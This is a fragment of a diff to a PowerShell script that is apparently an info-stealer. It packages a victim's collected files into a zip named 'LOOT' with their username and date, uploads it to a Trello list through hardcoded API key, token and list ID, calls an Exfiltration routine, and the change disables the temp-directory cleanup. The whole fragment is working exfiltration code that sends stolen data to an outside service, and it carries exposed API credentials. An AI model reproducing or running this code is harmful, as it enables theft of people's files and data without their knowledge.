@@ -80,7 +80,7 @@ $username = $env:username
 $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
 
 # Specify the destination zip file path with username and date
-$zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
+$zipFileName = "L00T"
 $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
 # Function to create a zip archive using Compress-Archive
@@ -98,7 +98,7 @@ ZipFiles
 function Upload-Trello{
     
 # Replace the following values with your own
-$name = "LOOT"
+$name = "${username}_LOOT_${dateSansHeure}"
 $idList = "65c269cf32172bbc68af098b"
 $key = "e790f6a8afdd977c1ee4ccc549594c51"
 $token = "ATTA5d320a9d9329170b731f2c4a458ff9feb7777bd447bfaf0479a4646e26c8239b83D4CC8D"
@@ -546,4 +546,4 @@ TempDir
 Exfiltration
 
 # Call DelTempDir
-DelTempDir
+#DelTempDir
